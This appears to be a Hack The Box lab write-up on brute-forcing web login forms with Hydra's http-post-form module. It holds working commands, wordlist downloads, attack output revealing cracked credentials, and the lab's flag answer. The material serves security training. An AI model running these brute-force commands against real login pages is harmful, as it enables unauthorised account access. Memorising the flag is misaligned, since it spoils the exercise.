# Login Forms
## http-post-form
Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body.

```sh
masterofblafu@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```

Failure condition example:

```sh
$ hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

Success condition example:

```sh
$ hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

## Constructing the params String for Hydra

The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string. These can have static values or dynamic placeholders if their values change with each request.
- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

Therefore, our params string would be:
```sh
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

- `"/"`: The path where the form is submitted.
- `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
- `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.

```sh
# Download wordlists if needed
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Questions
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find? **Answer: HTB{W3b_L0gin_Brut3F0rc3}**
   - Inspect the network, identify that the login request look something like this:
        ```
        POST / HTTP/1.1
        Host: 154.57.164.75:30229
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 25

        username=abc&password=xyz
        ```
   - Brute force the login form by using the `http-post-form` module with the corresponding param string matching the POST request → found credentials `admin`:`zxcvbnm`
        ```sh
        $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.75 -s 30229 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-13 22:59:54
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
        [DATA] attacking http-post-form://154.57.164.75:30229/:username=^USER^&password=^PASS^:F=Invalid credentials
        [30229][http-post-form] host: 154.57.164.75   login: admin   password: zxcvbnm
        [STATUS] attack finished for 154.57.164.75 (valid pair found)
        1 of 1 target successfully completed, 1 valid password found
        ```
   - Login and read the flag
